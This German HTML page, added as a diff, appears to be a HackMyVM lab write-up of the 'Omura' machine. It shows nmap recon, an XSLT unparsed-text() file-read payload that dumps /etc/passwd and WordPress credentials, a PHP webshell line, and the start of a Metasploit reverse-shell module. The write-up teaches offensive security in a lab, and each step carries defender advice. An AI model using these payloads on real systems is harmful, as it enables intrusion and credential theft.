@@ -1,0 +1,777 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Omura - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Omura - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">lftp</div>
+                 <div class="tool-item">wfuzz</div>
+                 <div class="tool-item">IDA Pro/Ghidra (implizit)</div>
+                 <div class="tool-item">ln</div>
+                 <div class="tool-item">crunch</div>
+                 <div class="tool-item">ffuf</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">vi (implizit)</div>
+                 <div class="tool-item">msfconsole</div>
+                 <div class="tool-item">Metasploit (wp_admin_shell_upload)</div>
+                 <div class="tool-item">zip (versucht)</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">stty</div>
+                 <div class="tool-item">sudo (versucht)</div>
+                 <div class="tool-item">ss</div>
+                 <div class="tool-item">man</div>
+                 <div class="tool-item">cp (implizit)</div>
+                 <div class="tool-item">apt</div>
+                 <div class="tool-item">nano (implizit)</div>
+                 <div class="tool-item">systemctl</div>
+                 <div class="tool-item">iscsiadm</div>
+                 <div class="tool-item">lsblk</div>
+                 <div class="tool-item">mkdir</div>
+                 <div class="tool-item">mount</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">chmod (implizit)</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">umount</div>
+                 <div class="tool-item">rm</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration-port80">Web Enumeration (Port 80 - XSLT)</a></li>
+                <li><a href="#proof-of-concept-xslt">Proof of Concept (XSLT LFI)</a></li>
+                <li><a href="#vhost-wordpress-enumeration">VHost & WordPress Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (Metasploit - WordPress)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (www-data -> root via iSCSI)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.126	08:00:27:33:2b:2b	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` sendet ARP-Anfragen ins lokale Netzwerk, um aktive Geräte zu entdecken.</p>
+             <p class="evaluation">**Bewertung:** Ein Host wird unter der IP `192.168.2.126` gefunden. Die MAC-Adresse (`08:00:27:...`) weist auf eine VirtualBox-VM hin. Dies ist das Zielsystem.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP `192.168.2.126` für weitere Scans (Nmap) verwenden.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Hauptaugenmerk auf die Absicherung der Dienste legen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.126 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-11 14:05 CEST
+Nmap scan report for omura.hmv (192.168.2.126)
+Host is up (0.00014s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 dbf946e520816ceec72508ab2251366c (RSA)
+|   256 33c09564294723dd864ee6b8073367ad (ECDSA)
+|_  256 beaa6d4243dd7dd40e0d7478c189a136 (ED25519)
+<span class="command">80/tcp   open  http    Apache httpd 2.4.54 ((Debian))</span>
+<span class="password">|_http-title: XSLT Transformation</span> <span class="password"><-- Hinweis auf XSLT!</span>
+|_http-server-header: Apache/2.4.54 (Debian)
+<span class="command">3260/tcp open  iscsi   Synology DSM iSCSI</span> <span class="password"><-- iSCSI Port offen!</span>
+| iscsi-info:
+|   <span class="command">iqn.2023-02.omura.hmv:target01</span>:
+|     Address: 192.168.2.126:3260,1
+|     Authentication: <span class="password">required</span>
+|_    Auth reason: Authorization failure
+MAC Address: 08:00:27:33:2B:2B (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms omura.hmv (192.168.2.126)
+
+Nmap done: 1 IP address (1 host up) scanned in X.XX seconds</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan (`-sS -sC -sV -T5 -A -p-`) wird auf `192.168.2.126` (omura.hmv) ausgeführt.</p>
+             <p class="evaluation">**Bewertung:** Drei offene TCP-Ports sind von Interesse:
+*   **Port 22 (SSH):** OpenSSH 8.4p1 (Debian). Standard-Fernzugriff.
+*   **Port 80 (HTTP):** Apache 2.4.54 (Debian). Der Titel der Webseite ("XSLT Transformation") ist ein sehr starker Hinweis auf die verwendete Technologie und potenzielle Schwachstellen (XXE, LFI, RCE via XSLT).
+*   **Port 3260 (iSCSI):** Ein iSCSI-Target ist verfügbar (`iqn.2023-02.omura.hmv:target01`). Es erfordert Authentifizierung (CHAP, laut späterer Analyse), und der anonyme Zugriff schlägt fehl. Dies ist ein interessanter, aber zunächst nachrangiger Vektor.</p>
+             <p class="recommendation">**Empfehlung (Pentester):**
+    1.  **HTTP (Priorität 1):** Untersuchen Sie die Webanwendung auf Port 80 intensiv. Der Titel "XSLT Transformation" deutet auf eine XSLT-Verarbeitung hin. Suchen Sie nach Upload-Möglichkeiten für XML/XSL-Dateien oder Endpunkten, die diese verarbeiten. Erforschen Sie XSLT-spezifische Schwachstellen.
+    2.  **iSCSI (Priorität 2):** Halten Sie iSCSI im Hinterkopf. Suchen Sie nach Konfigurationsdateien oder anderen Lecks, die CHAP-Credentials enthalten könnten.
+    3.  **SSH (Priorität 3):** Suchen Sie nach Benutzernamen.<br>
+**Empfehlung (Admin):** Überprüfen Sie die XSLT-Implementierung auf Port 80 auf Sicherheit (insbesondere Schutz gegen XXE, LFI, RCE). Stellen Sie sicher, dass die iSCSI-Authentifizierung (CHAP) starke, nicht leicht zu erratende oder zu findende Passwörter verwendet. Härten Sie SSH.</p>
+        </section>
+
+        <section id="web-enumeration-port80">
+            <h2>Web Enumeration (Port 80 - XSLT)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.126" -I</span></div>
+                     <pre>
+HTTP/1.1 200 OK
+Date: Tue, 11 Apr 2023 12:08:38 GMT
+Server: Apache/2.4.54 (Debian)
+Content-Type: text/html; charset=UTF-8</pre>
+                     <pre><span class="comment">*</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** `curl -I` ruft die HTTP-Header der Startseite ab.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt den `200 OK`-Status und den `Content-Type`. Keine auffälligen Header.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Inhalt der Seite analysieren.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.126 -x [...] -w [...] -b '403,404' -e -t 100 -n -k</span></div> <span class="comment"><-- Diverse Dateiendungen getestet --></span>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[+] Url:                     http://192.168.2.126
+[...]
+===============================================================
+[... Zeitstempel ...] Starting gobuster
+===============================================================
+<span class="command">http://192.168.2.126/index.php</span>            [Size: 795]
+<span class="command">http://192.168.2.126/process.php</span>          [Size: 0] <span class="password"><-- Wahrscheinlicher Verarbeitungs-Endpunkt! --></span>
+[...] <span class="comment">(Keine weiteren relevanten Funde im Log)</span>
+===============================================================
+[... Zeitstempel ...] Finished
+===============================================================</pre>
+                     <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird verwendet, um nach Verzeichnissen und Dateien auf Port 80 zu suchen. Es testet viele Erweiterungen (`-x`) und blendet 403/404-Fehler aus (`-b`). `-n` unterdrückt Statuscodes in der Ausgabe, `-k` ignoriert SSL-Fehler (hier irrelevant).</p>
+             <p class="evaluation">**Bewertung:** Findet zwei PHP-Dateien: `index.php` (die Hauptseite) und `process.php`. `process.php` ist besonders interessant, da sie wahrscheinlich die im Titel erwähnte XSLT-Transformation durchführt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie die `index.php`, um zu verstehen, wie Daten an `process.php` gesendet werden (Formular? Parameter?). Untersuchen Sie `process.php` auf Schwachstellen, insbesondere im Kontext der XSLT-Verarbeitung.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass `process.php` Benutzereingaben (XML, XSL) sicher verarbeitet und gegen XSLT-spezifische Angriffe (XXE, LFI, RCE) gehärtet ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.126 -C all</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.126
++ Target Hostname:    192.168.2.126
++ Target Port:        80
++ Start Time:         2023-04-11 14:08:49 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.54 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. [...]
++ /: The X-Content-Type-Options header is not set. [...]
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ 26640 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2023-04-11 14:12:10 (GMT2) (201 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                     <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Nikto (`-C all` für umfassende CGI-Prüfung) wird auf Port 80 ausgeführt.</p>
+             <p class="evaluation">**Bewertung:** Ähnlich wie zuvor findet Nikto nur fehlende Sicherheitsheader und keine kritischen Schwachstellen. Die Meldung über "junk HTTP methods" ist meist von geringer Bedeutung.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Konzentrieren Sie sich auf die Anwendungslogik von `index.php` und `process.php`.<br>**Empfehlung (Admin):** Implementieren Sie die fehlenden Sicherheitsheader als Best Practice.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="command">http://omura.hmv/</span> <span class="comment"><-- Inhalt der index.php --></span>
+
+Saxon-B-XSLT
+
+Saxon-B-XSLT is an XML transformation engine that allows
+converting XML files into different output formats, such
+as HTML, PDF, or even other XML files, using XSLT style
+sheets.</pre>
+                     <pre><span class="comment">::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Textinhalt der Startseite (`index.php`) wird angezeigt.</p>
+              <p class="evaluation">**Bewertung:** Bestätigt explizit die Verwendung von "Saxon-B-XSLT", einer spezifischen XSLT-Engine. Dies unterstreicht die Notwendigkeit, nach bekannten Schwachstellen oder unsicheren Konfigurationen dieser Engine in Kombination mit PHP zu suchen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Recherchieren Sie gezielt nach Schwachstellen in Saxon-B-XSLT unter PHP. Prüfen Sie insbesondere, ob Funktionen wie `document()` oder `unparsed-text()` aktiviert sind und für LFI/XXE missbraucht werden können.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass die verwendete Saxon-B-Bibliothek aktuell ist und sicher konfiguriert wurde (z.B. Deaktivierung gefährlicher Funktionen, wenn nicht benötigt).</p>
+         </section>
+
+        <section id="proof-of-concept-xslt">
+            <h2>Proof of Concept (XSLT LFI)</h2>
+            <p class="comment">**Kurzbeschreibung:** Die Webanwendung unter `/process.php` verarbeitet Benutzereingaben mittels der Saxon-B-XSLT Engine. Diese Implementierung ist anfällig für Local File Inclusion (LFI), da die XSLT-Funktion `unparsed-text()` nicht ausreichend eingeschränkt ist. Ein Angreifer kann eine präparierte XSL-Datei zusammen mit einer beliebigen XML-Datei hochladen oder referenzieren. Die XSL-Datei weist die Engine an, den Inhalt einer lokalen Datei auf dem Server zu lesen und in die Ausgabe der Transformation einzubetten.</p>
+            <p class="comment">**Voraussetzungen:** Netzwerkzugriff auf Port 80, Kenntnis des `process.php`-Endpunkts und der XSLT-Verarbeitung.</p>
+            <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+            <ol>
+                <li>Erstellen einer einfachen XML-Datei (z.B. `file.xml`) als Eingabe für die Transformation.</li>
+                <li>Erstellen einer bösartigen XSL-Datei (z.B. `read.xsl`), die `unparsed-text('/pfad/zur/datei', 'utf-8')` verwendet, um eine Zieldatei zu lesen.</li>
+                <li>Senden der XML- und XSL-Dateien an den `/process.php`-Endpunkt (die genaue Methode - z.B. POST mit Dateiupload - muss durch Analyse von `index.php` oder Fuzzing ermittelt werden).</li>
+            </ol>
+            <p class="comment">**Erwartetes Ergebnis:** Der Inhalt der angeforderten lokalen Datei wird in der HTTP-Antwort von `process.php` zurückgegeben.</p>
+            <p class="comment">**Beweismittel:**</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">cat file.xml</span></div>
+                     <pre>
+Choose XSL file : <span class="comment"><-- Teil der Web-Oberfläche? --></span>
+
+Choose XML file : <span class="comment"><-- Teil der Web-Oberfläche? --></span>
+<?xml version="1.0" encoding="UTF-8"?>
+<catalog>
+    <cd>
+        <title>CD Title</title>
+        <artist>The artist</artist>
+        <company>Da Company</company>
+        <price>10000</price>
+        <year>1760</year>
+    </cd>
+</catalog></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Zeigt den Inhalt einer Beispiel-XML-Datei (`file.xml`), die als Eingabe für die XSLT-Transformation dient.</p>
+             <p class="evaluation">**Bewertung:** Standard-XML, dient nur als Platzhalter-Eingabe.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="comment">
+Read Local File
+read.xsl</span></pre>
+                     <pre>
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
+<xsl:template match="/">
+<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
+</xsl:template>
+</xsl:stylesheet></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Zeigt den Inhalt einer bösartigen XSL-Datei (`read.xsl`). Sie verwendet die Funktion `unparsed-text('/etc/passwd', 'utf-8')`, um den Inhalt der Datei `/etc/passwd` zu lesen und als Ergebnis der Transformation auszugeben.</p>
+             <p class="evaluation">**Bewertung:** Dies ist der LFI-Payload. Wenn `process.php` diese XSL-Datei zur Transformation verwendet, wird der Inhalt von `/etc/passwd` zurückgegeben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">curl http://omura.hmv/process.php</span></div> <span class="comment"><-- Annahme: XML/XSL wurden zuvor übermittelt --></span>
+                     <pre>
+<span class="password">root:x:0:0:root:/root:/bin/bash</span>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+<span class="command">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
+<span class="command">ford:x:1000:1000:,,,:/home/ford:/bin/bash</span> <span class="password"><-- Regulärer Benutzer gefunden! --></span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** `curl` wird verwendet, um die Antwort von `process.php` abzurufen, nachdem die XML- und die LFI-XSL-Dateien (aus den vorherigen Schritten) verarbeitet wurden.</p>
+             <p class="evaluation">**Bewertung:** Die XSLT LFI war erfolgreich! Der Inhalt von `/etc/passwd` wird zurückgegeben. Dies bestätigt die Schwachstelle und liefert eine Liste von Systembenutzern. Besonders interessant ist der Benutzer `ford` (UID 1000) mit einer `/bin/bash`-Shell.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die LFI-Schwachstelle weiter, um andere sensible Dateien zu lesen:
+    *   Konfigurationsdateien (z.B. `/etc/apache2/apache2.conf`, `/var/www/html/index.php`, `/var/www/html/process.php`, mögliche WordPress-Konfigs, SSH-Konfigs).
+    *   Private Schlüssel (z.B. `/home/ford/.ssh/id_rsa`, `/root/.ssh/id_rsa`).
+    *   Logdateien.
+    *   Versuchen Sie, die LFI zu RCE (Remote Code Execution) zu eskalieren, falls die XSLT-Engine dies zulässt (z.B. über PHP-Funktionen, falls PHP im XSLT-Kontext ausgeführt werden kann, was bei Saxon-B oft nicht direkt der Fall ist, aber über Erweiterungen möglich sein könnte).<br>
+**Empfehlung (Admin):** Beheben Sie die XSLT-LFI-Schwachstelle dringend! Konfigurieren Sie die Saxon-B-Engine so, dass gefährliche Funktionen wie `unparsed-text` deaktiviert oder auf sichere Verzeichnisse beschränkt sind. Validieren Sie Benutzereingaben für XML/XSL.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">cat read.xsl</span></div>
+                      <pre>
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
+<xsl:template match="/">
+<xsl:value-of select="unparsed-text('/var/www', 'utf-8')"/> <span class="comment"><-- Versuch, Verzeichnis zu lesen --></span>
+</xsl:template>
+</xsl:stylesheet></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">cat read.xsl</span></div>
+                      <pre>
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
+<xsl:template match="/">
+<xsl:value-of select="unparsed-text('/var/www/wordpress/wp-config.php', 'utf-8')"/> <span class="comment"><-- Gezielter Leseversuch --></span>
+</xsl:template>
+</xsl:stylesheet></pre>
+                       <pre><span class="comment">::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span></pre>
+                       <pre><span class="command">http://omura.hmv/process.php</span> <span class="comment"><-- Ergebnis des zweiten Versuchs --></span>
+
+define( 'DB_USER', '<span class="password">admin</span>' );
+/ Database password */
+define( 'DB_PASSWORD', '<span class="password">dw42k25MiXT</span>' );
+/ Database hostname */
+define( 'DB_HOST', '<span class="password">localhost</span>' );</pre>
+                       <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die LFI-Schwachstelle wird weiter ausgenutzt. Zuerst wird versucht, das Verzeichnis `/var/www` zu lesen (was mit `unparsed-text` normalerweise nicht direkt funktioniert). Dann wird gezielt versucht, die Datei `/var/www/wordpress/wp-config.php` zu lesen. *Der Pfad `/var/www/wordpress` wurde entweder erraten oder durch vorheriges Auslesen von `/var/www` (falls erfolgreich) oder Apache-Konfigs gefunden.*</p>
+              <p class="evaluation">**Bewertung:** Der Leseversuch für `wp-config.php` ist erfolgreich! Die Datenbank-Credentials (`admin`:`dw42k25MiXT`) für eine WordPress-Installation werden extrahiert. Dies deutet darauf hin, dass neben der XSLT-Anwendung auch eine WordPress-Seite auf dem Server läuft, möglicherweise als virtueller Host.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Suchen Sie nach dem virtuellen Host für die WordPress-Installation (z.B. mittels `wfuzz` VHost-Fuzzing). Versuchen Sie, sich mit den gefundenen Credentials im WordPress-Admin-Backend anzumelden.<br>**Empfehlung (Admin):** Schützen Sie Konfigurationsdateien durch restriktive Dateiberechtigungen. Vermeiden Sie das Hosting mehrerer kritischer Anwendungen auf demselben Server ohne ausreichende Segmentierung.</p>
+            <p class="comment">**Risikobewertung:** Kritisch. Die XSLT-LFI ermöglicht das Auslesen beliebiger Dateien, auf die der Webserver-Benutzer (`www-data`) Zugriff hat, einschließlich sensibler Konfigurationsdateien und potenziell privater Schlüssel.</p>
+            <p class="comment">**Empfehlungen:** Siehe vorherige Admin-Empfehlungen zur Behebung der XSLT-LFI.</p>
+        </section>
+
+        <section id="vhost-wordpress-enumeration">
+             <h2>VHost & WordPress Enumeration</h2>
+             <p class="analysis">**Analyse:** Nachdem Datenbank-Credentials für WordPress gefunden wurden, wird nach dem entsprechenden virtuellen Host gesucht und dieser dann untersucht.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.omura.hmv" -u "http://omura.hmv" --hc 404 -t 200 --hh 795</span></div>
+                     <pre>
+[...]
+Target: http://omura.hmv/
+[...]
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000000587:   200        127 L    1303 W     28732 Ch    "wordpress"</span>   <span class="password"><-- VHost gefunden! --></span>
+[...]</pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** `wfuzz` wird für VHost-Enumeration verwendet. Es testet Subdomains (`FUZZ.omura.hmv`) als Host-Header gegen die IP des Ziels (`http://omura.hmv` -> `192.168.2.126`). Antworten mit Status 404 oder einer Größe von 795 Bytes (die Größe von `index.php` auf der Hauptseite) werden ignoriert.</p>
+              <p class="evaluation">**Bewertung:** Der Scan ist erfolgreich und findet den virtuellen Host `wordpress.omura.hmv`, der eine andere Antwort (28732 Chars) als die Standardseite liefert.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Fügen Sie den Eintrag `192.168.2.126 wordpress.omura.hmv` zu Ihrer lokalen `/etc/hosts`-Datei hinzu. Greifen Sie auf `http://wordpress.omura.hmv/` zu und versuchen Sie den WordPress-Login mit den gefundenen Credentials.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass virtuelle Hosts korrekt konfiguriert und gesichert sind.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">vi /etc/hosts</span></div>
+                      <pre><span class="command">wordpress.omura.hmv</span></pre> <span class="comment"><-- Eintrag hinzugefügt --></span>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der gefundene virtuelle Host `wordpress.omura.hmv` wird der lokalen `/etc/hosts`-Datei des Angreifers hinzugefügt, um ihn im Browser oder mit Tools aufrufen zu können.</p>
+              <p class="evaluation">**Bewertung:** Notwendiger Konfigurationsschritt auf der Angreiferseite.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">http://wordpress.omura.hmv/wp-login.php</span>
+
+Username: <span class="command">admin</span>
+Password: <span class="password">dw42k25MiXT</span></pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Versuch, sich über `http://wordpress.omura.hmv/wp-login.php` mit den zuvor via LFI gefundenen Datenbank-Credentials (`admin`:`dw42k25MiXT`) im WordPress-Backend anzumelden.</p>
+             <p class="evaluation">**Bewertung:** Der Login ist erfolgreich (impliziert durch die nächsten Schritte).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Suchen Sie nach Möglichkeiten, über das WordPress-Admin-Backend eine Shell zu erhalten (Plugin-Upload, Theme-Editor, bekannte Schwachstellen).<br>**Empfehlung (Admin):** Verwenden Sie niemals Datenbank-Passwörter als Admin-Login-Passwörter. Sichern Sie das WP-Admin-Backend.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">http://wordpress.omura.hmv/wp-admin/theme-editor.php?file=404.php&theme=twentytwentyone</span>
+
+system($GET['cmd']); <span class="comment"><-- Versuch, Webshell einzufügen --></span>
+
+klappte nicht, keine Schreibrechte...</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Es wird versucht, über den Theme-Editor (`theme-editor.php`) eine einfache PHP-Webshell (`system($GET['cmd']);`) in die `404.php`-Datei des aktiven Themes (`twentytwentyone`) einzufügen. Dies ist eine gängige Methode, um RCE über WordPress zu erlangen.</p>
+              <p class="evaluation">**Bewertung:** Der Versuch schlägt fehl ("klappte nicht, keine Schreibrechte..."). Der Webserver-Benutzer (`www-data`) hat keine Schreibrechte auf die Theme-Dateien, was eine häufige Sicherheitsmaßnahme ist.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie alternative Methoden für RCE über WordPress:
+    *   **Plugin-Upload:** Erstellen Sie ein bösartiges Plugin als ZIP-Datei und laden Sie es über "Plugins -> Add New -> Upload Plugin" hoch.
+    *   **Exploits:** Suchen Sie mit `wpscan` nach bekannten Schwachstellen in der WordPress-Version oder installierten Plugins/Themes.<br>
+**Empfehlung (Admin):** Deaktivieren Sie den Theme- und Plugin-Editor in `wp-config.php` (`define('DISALLOW_FILE_EDIT', true);`). Stellen Sie sicher, dass die Dateiberechtigungen im WordPress-Verzeichnis korrekt gesetzt sind (Webserver sollte keine Schreibrechte auf PHP-Dateien haben).</p>
+         </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Metasploit - WordPress)</h2>
+             <p class="analysis">**Analyse:** Da der manuelle Theme-Editor-Versuch fehlschlug, wird das Metasploit Framework verwendet, um den initialen Zugriff über eine bekannte WordPress-Schwachstelle (Admin Shell Upload) zu automatisieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 > <span class="command">use exploit/unix/webapp/wp_admin_shell_upload</span></div>
+                     <pre>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(unix/webapp/wp_admin_shell_upload) > <span class="command">options</span></div>
+                     <pre>
+Module options (exploit/unix/webapp/wp_admin_shell_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                   yes       The WordPress password to authenticate with
+   Proxies                     no        A proxy chain [...]
+   RHOSTS                     yes       The target host(s), [...]
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   USERNAME                   yes       The WordPress username to authenticate with
+   VHOST                      no        HTTP server virtual host
+
